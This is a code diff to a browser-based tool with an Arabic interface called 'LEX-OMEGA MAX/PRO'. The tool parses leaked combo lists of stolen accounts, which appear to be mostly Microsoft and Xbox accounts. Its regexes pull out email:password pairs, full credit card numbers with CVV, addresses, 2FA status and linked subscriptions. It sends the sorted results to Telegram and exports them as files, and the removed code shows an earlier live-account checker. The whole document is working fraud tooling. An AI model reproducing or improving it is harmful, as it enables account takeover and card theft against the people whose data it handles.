+        const userAddressRegex = /Address\s*=\s*\[\s*Address:\s*([^,\]]+),\s*City:\s*([^,\]]+),\s*State:\s*([^,\]]+),\s*Postalcode:\s*([^\]]+)\s*\]/i;
+        const securityStatusRegex = /(2fa|2\s?step|mfa|two\s?factor|backup\s?code|google\s?authenticator|authenticator|TOTP|Security\s?Questions|Enabled\s*:\s*2FA|Recovery\s?Email)\s*[:=\-]?\s*(Yes|On|True|Email\s*:\s*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}))/i;
+        const inferredPaymentRegex = /(Product Type 🔥\s*=\s*(Game|Consumable)|Subscription\s*🙂\s*=\s*(Xbox Game Pass Ultimate|Microsoft 365 (Personal|Family|Basic)|EA Play|Gold))\s*.*(Price\s*=\s*(\d+(\.\d{1,2})?)\s*(USD|EUR|GBP|BRL|CAD|CLP|NOK))/i;
+
+        for (const line of lines) {
+            emailPwRegex.lastIndex = 0; priceRegex.lastIndex = 0;
+            ultraCardRegex.lastIndex = 0; partialCardRegex.lastIndex = 0;
+            userAddressRegex.lastIndex = 0; extendedFeaturesRegex.lastIndex = 0;
+            securityStatusRegex.lastIndex = 0;
+            inferredPaymentRegex.lastIndex = 0; 
+            
+            let match;
+            
+            if ((match = emailPwRegex.exec(line)) !== null) {
+                const email = match[1].trim();
+                const password = match[2].trim();
+                
+                const hasGamePass = gamePassKeywords.test(line);
+                let priceMatch = priceRegex.exec(line);
+                let extractedPrice = null;
+                let cardDetails = null; 
+                let ultraCardDetails = null; 
+                let addressDetails = null;
+                let extendedFeatures = []; 
+                let securityStatus = null; 
+                let hasInferredPayment = false; 
+
+                if (priceMatch) extractedPrice = priceMatch[2];
+                if (inferredPaymentRegex.test(line)) {
+                    hasInferredPayment = true;
                 }
-            };
+                
+                if (toolType === 'pro') {
+                    let featureMatch;
+                    while ((featureMatch = extendedFeaturesRegex.exec(line)) !== null) {
+                         const feature = featureMatch[1].trim().toLowerCase().replace(/\s/g, '');
+                         if (!extendedFeatures.includes(feature)) { extendedFeatures.push(feature); }
+                    }
 
-            const pool = Array(threads).fill(null).map(() => worker());
-            await Promise.all(pool);
-            document.getElementById('btn').disabled = false; isRunning = false;
+                    const addressMatch = userAddressRegex.exec(line);
+                    if (addressMatch) {
+                        addressDetails = { address: addressMatch[1].trim(), city: addressMatch[2].trim(), state: addressMatch[3].trim(), zip: addressMatch[4].trim() };
+                    }
+                    
+                    const securityMatch = securityStatusRegex.exec(line);
+                    if (securityMatch) {
+                        const type = securityMatch[1].toLowerCase();
+                        const value = securityMatch[3] ? securityMatch[3].trim() : securityMatch[2];
+                        if (type.includes('2fa') || type.includes('step') || type.includes('mfa') || type.includes('factor') || type.includes('authenticator')) {
+                            securityStatus = `2FA: ${value.toLowerCase().includes('yes') || value.toLowerCase().includes('on') ? 'مفعلة' : 'مذكورة'}`;
+                        } else if (type.includes('recovery')) {
+                             securityStatus = `إيميل احتياطي: ${value}`;
+                        }
+                    }
+                    
+                    const ultraMatch = ultraCardRegex.exec(line);
+                    if (ultraMatch) {
+                        ultraCardDetails = {
+                            number: ultraMatch[1].replace(/[^\d]/g, ''), 
+                            month: ultraMatch[2].padStart(2, '0'),
+                            year: ultraMatch[3].slice(-2),
+                            cvv: ultraMatch[4]
+                        };
+                        hasInferredPayment = true; 
+                    } else {
+                        const partialMatch = partialCardRegex.exec(line);
+                        if (partialMatch) {
+                            cardDetails = {
+                                last4: partialMatch[1].trim(), 
+                                month: partialMatch[2].trim().padStart(2, '0'),
+                                year: partialMatch[3].trim().slice(-2),
+                            };
+                            hasInferredPayment = true; 
+                        }
+                    }
+                }
+
+                if (email && password.length > 0) {
+                    extractedPairs.push([email, password, hasGamePass, extractedPrice, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasInferredPayment]);
+                }
+            }
+        }
+        
+        if (0 === extractedPairs.length) {
+             parseBtn.classList.remove('processing');
+             parseBtn.textContent = (toolType === 'max') ? "استخراج وتدقيق MAX" : "استخراج وتدقيق PRO";
+             return showToast("ماكو نتائج مطابقة");
         }
 
-        function downloadResults() {
-            const blob = new Blob([liveList.join('\n')], {type: 'text/plain'});
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = 'live_accounts.txt'; a.click();
+        const uniqueResults = [];
+        for (const [email, password, hasGP, price, card, address, ultraCard, features, security, inferredPayment] of extractedPairs) {
+            const key = email.toLowerCase() + ":" + password;
+            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);
+
+            if (existingIndex === -1) {
+                uniqueResults.push([email, password, hasGP, price, card, address, ultraCard, features, security, inferredPayment]);
+            } else {
+                const existingItem = uniqueResults[existingIndex];
+                if (hasGP && !existingItem[2]) existingItem[2] = true; 
+                if (price !== null && existingItem[3] === null) existingItem[3] = price;
+                if (card !== null && existingItem[4] === null) existingItem[4] = card;
+                if (address !== null && existingItem[5] === null) existingItem[5] = address;
+                if (ultraCard !== null && existingItem[6] === null) existingItem[6] = ultraCard;
+                if (security !== null && existingItem[8] === null) existingItem[8] = security; 
+                if (inferredPayment && !existingItem[9]) existingItem[9] = true; 
+                existingItem[7] = [...new Set([...existingItem[7], ...features])];
+            }
         }
-    </script>
+
+        // 4. إرسال النتائج النهائية مع تضمين البصمة
+        if (uniqueResults.length > 0) {
+            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, card, address, ultraCard, features, security, inferredPayment]) => {
+                let text = `${email}:${password}`;
+                if (inferredPayment) text += " 💳";
+                if (hasGP) text += " | كيم باس";
+                if (price) text += ` | رصيد $${price}`;
+                if (ultraCard) {
+                    text += ` | 💳 CC FULL: ${ultraCard.number}|${ultraCard.month}/${ultraCard.year}|${ultraCard.cvv}`;
+                } else if (card) {
+                    text += ` | 💳 CC PARTIAL: ****${card.last4}, ${card.month}/${card.year}`;
+                }
+                if (address) {
+                    text += ` | 📍 العنوان: ${address.city}, ${address.zip}`;
+                }
+                if (security) {
+                    text += ` | 🔒 ${security}`;
+                }
+                if (features.length > 0) {
+                    text += ` | ✨ خدمات: ${features.map(f => f.charAt(0).toUpperCase() + f.slice(1)).join(', ')}`;
+                }
+                return text;
+            }).join('\n');
+            
+            const toolName = (toolType === 'max') ? "MAX" : "PRO (GEN3)";
+            
+            // تعديل الهيدر لإضافة البصمة لتسهيل المقارنة
+            const header = `🎉 *نتائج أداة LEX-OMEGA ${toolName} الجديدة* 🎉\n\n*البصمة:* \`${currentHash}\` (للتحقق من التكرار)\nتم استخراج ${uniqueResults.length} نتيجة فريدة:\n\n\`\`\``;
+            
+            const footer = "\n\`\`\`\nتم الإرسال تلقائياً من الأداة.";
+            sendToTelegram(header + telegramMessage + footer);
+        }
+
+        // 5. بناء قائمة النتائج (العرض على الشاشة)
+        uniqueResults.forEach(([email, password, hasGamePass, price, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasInferredPayment]) => {
+            const itemDiv = document.createElement("div");
+            itemDiv.className = "item";
+            const leftDiv = document.createElement("div");
+            leftDiv.className = "left";
+            const emailDiv = document.createElement("div");
+            emailDiv.className = "email";
+            emailDiv.textContent = email;
+            
+            if (hasInferredPayment) {
+                 const visaSpan = document.createElement("span");
+                 visaSpan.textContent = " 💳";
+                 emailDiv.appendChild(visaSpan);
+            }
+            const pwDiv = document.createElement("div");
+            pwDiv.className = "pw";
+            pwDiv.appendChild(document.createTextNode(password)); 
+            if (hasGamePass) {
+                 const gpSpan = document.createElement("span"); gpSpan.className = "gamepass-note"; gpSpan.textContent = "🎮 كيم باس"; pwDiv.appendChild(gpSpan); 
+            }
+            if (price !== null) {
+                 const priceSpan = document.createElement("span"); priceSpan.className = "price-note"; priceSpan.textContent = `💲 رصيد $${price}`; pwDiv.appendChild(priceSpan); 
+            }
+            if (toolType === 'pro' && securityStatus) {
+                 const securitySpan = document.createElement("span"); securitySpan.className = "security-note"; securitySpan.textContent = `🔒 ${securityStatus}`; pwDiv.appendChild(securitySpan);
+            }
+            if (toolType === 'pro' && ultraCardDetails) {
+                 const cardSpan = document.createElement("span"); cardSpan.className = "ultra-cc-note"; cardSpan.textContent = `⚡️ CC FULL | ${ultraCardDetails.number} | ${ultraCardDetails.month}/${ultraCardDetails.year} | CVV: ${ultraCardDetails.cvv}`; pwDiv.appendChild(cardSpan);
+            }
+            else if (toolType === 'pro' && cardDetails) {
+                 const cardSpan = document.createElement("span"); cardSpan.className = "cc-note"; cardSpan.textContent = `💳 CC PARTIAL | ****${cardDetails.last4} (${cardDetails.month}/${cardDetails.year})`; pwDiv.appendChild(cardSpan);
+            }
+            if (toolType === 'pro' && addressDetails) {
+                 const addressSpan = document.createElement("span"); addressSpan.className = "address-note"; addressSpan.textContent = `📍 العنوان: ${addressDetails.city}, ${addressDetails.zip}`; pwDiv.appendChild(addressSpan);
+            }
+            if (toolType === 'pro' && extendedFeatures.length > 0) {
+                 const featureSpan = document.createElement("span"); featureSpan.className = "feature-note";
+                 const featureNames = extendedFeatures.map(f => {
+                    if (f === 'disney+') return 'Disney+';
+                    if (f === 'hbomax') return 'HBO Max';
+                    if (f === 'eaplay') return 'EA Play';
+                    if (f === 'amazonprime') return 'Prime';
+                    if (f === 'discordnitro') return 'Nitro';
+                    if (f === 'chatgptplus') return 'ChatGPT Plus';
+                    if (f === 'adobecc') return 'Adobe CC';
+                    if (f === 'midjourney') return 'Midjourney';
+                    return f.charAt(0).toUpperCase() + f.slice(1);
+                 }).join(', ');
+                 featureSpan.textContent = `🔥 خدمات: ${featureNames}`; pwDiv.appendChild(featureSpan);
+            }
+            leftDiv.appendChild(emailDiv); leftDiv.appendChild(pwDiv);
+            const controlsDiv = document.createElement("div"); controlsDiv.className = "controls";
+            const copyEmailBtn = document.createElement("button"); copyEmailBtn.className = "copy-btn btn-red"; copyEmailBtn.textContent = "نسخ الإيميل"; copyEmailBtn.onclick = async () => { await copyText(email) && showToast("تم نسخ الإيميل"); };
+            const copyPwBtn = document.createElement("button"); copyPwBtn.className = "copy-btn btn-black"; copyPwBtn.textContent = "نسخ الباسورد"; copyPwBtn.onclick = async () => { await copyText(password) && showToast("تم نسخ الباسورد"); };
+            controlsDiv.appendChild(copyEmailBtn); controlsDiv.appendChild(copyPwBtn);
+            itemDiv.appendChild(leftDiv); itemDiv.appendChild(controlsDiv);
+            listElement.appendChild(itemDiv);
+        });
+        
+        parseBtn.classList.remove('processing');
+        parseBtn.textContent = (toolType === 'max') ? "استخراج وتدقيق MAX" : "استخراج وتدقيق PRO";
+        showToast(`تم استخراج ${uniqueResults.length} نتيجة فريدة`)
+    }
+    
+    function setupCopyDownload(listElement, copyBtn, downloadBtn, toolName) { 
+        copyBtn.onclick = async () => { /* ... */ 
+            const e = listElement.querySelectorAll(".item");
+            if (!e.length) return void showToast("لا توجد نتائج لنسخها");
+            
+            const t = [...e].map(e => { 
+                const email = e.querySelector(".email").textContent.trim().replace('💳', '').trim(); // إزالة الإيموجي من النسخ
+                const pwDiv = e.querySelector(".pw");
+                const password = pwDiv.firstChild.textContent.trim(); 
+                
+                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
+                    let text = span.textContent.trim();
+                    text = text.replace('🎮 كيم باس', 'Game Pass'); text = text.replace('💲 رصيد', 'Credit');
+                    text = text.replace('⚡️ CC FULL | ', 'CC FULL: '); text = text.replace('💳 CC PARTIAL | ', 'CC PARTIAL: ');
+                    text = text.replace('📍 العنوان: ', 'Address: '); text = text.replace('🔒 ', 'Security: ');
+                    text = text.replace('🔥 خدمات: ', 'Features: ');
+                    return text;
+                }).join(' | ');
+
+                const hasInferred = e.querySelector(".email").textContent.includes('💳') ? 'INFERRED_PAYMENT' : '';
+                
+                let resultLine = email + ":" + password;
+                if (notes || hasInferred) {
+                    resultLine += " | " + (hasInferred ? hasInferred + (notes ? " | " : "") : "") + notes;
+                }
+                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, ''); // تنظيف الفواصل
+            }).join("\n");
+            
+            await copyText(t) && showToast(`تم نسخ كل نتائج ${toolName}`);
+        };
+        
+        downloadBtn.onclick = () => { /* ... */ 
+            const e = listElement.querySelectorAll(".item");
+            if (!e.length) return void showToast("لا توجد نتائج للتنزيل");
+            
+            const t = [...e].map(e => { 
+                const email = e.querySelector(".email").textContent.trim().replace('💳', '').trim(); // إزالة الإيموجي من التنزيل
+                const pwDiv = e.querySelector(".pw");
+                const password = pwDiv.firstChild.textContent.trim(); 
+                
+                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
+                    let text = span.textContent.trim();
+                    text = text.replace('🎮 كيم باس', 'Game Pass'); text = text.replace('💲 رصيد', 'Credit');
+                    text = text.replace('⚡️ CC FULL | ', 'CC FULL: '); text = text.replace('💳 CC PARTIAL | ', 'CC PARTIAL: ');
+                    text = text.replace('📍 العنوان: ', 'Address: '); text = text.replace('🔒 ', 'Security: ');
+                    text = text.replace('🔥 خدمات: ', 'Features: ');
+                    return text;
+                }).join(' | ');
+
+                const hasInferred = e.querySelector(".email").textContent.includes('💳') ? 'INFERRED_PAYMENT' : '';
+                
+                let resultLine = email + ":" + password;
+                if (notes || hasInferred) {
+                    resultLine += " | " + (hasInferred ? hasInferred + (notes ? " | " : "") : "") + notes;
+                }
+                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, '');
+            }).join("\n");
+            
+            const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
+            c.href = n, c.download = `${toolName}_emails_passwords_LEX-GEN3.txt`, c.click(), URL.revokeObjectURL(n), showToast("تم تنزيل الملف بنجاح");
+        };
+    }
+
+    function navigateTo(pageId) { 
+        if (pageId === 'tool') {
+            toolPage.classList.remove('hidden');
+            adminPage.classList.add('hidden');
+        } else if (pageId === 'admin') {
+            toolPage.classList.add('hidden');
+            adminPage.classList.remove('hidden');
+            //loadCodes(); // إذا كان كود الأدمن موجود
+        }
+    }
+    
+    // **********************************************
+    // ** تهيئة الصفحة عند التحميل **
+    // **********************************************
+    window.onload = () => {
+        clearBtnMax.onclick = () => { inputMax.value = "", listMax.innerHTML = "", showToast("تم مسح محتوى أداة MAX"); };
+        setupCopyDownload(listMax, copyAllBtnMax, downloadBtnMax, "MAX");
+        
+        clearBtnPro.onclick = () => { inputPro.value = "", listPro.innerHTML = "", showToast("تم مسح محتوى أداة PRO"); };
+        setupCopyDownload(listPro, copyAllBtnPro, downloadBtnPro, "PRO");
+
+        copyCodeBtn.onclick = copyGeneratedCode;
+        
+        // البدء بالأداة الافتراضية (MAX) وتحديث تحديد اللون الأحمر
+        switchTool('max'); 
+        navigateTo('tool'); 
+    };
+
+</script>
 </body>
 </html>
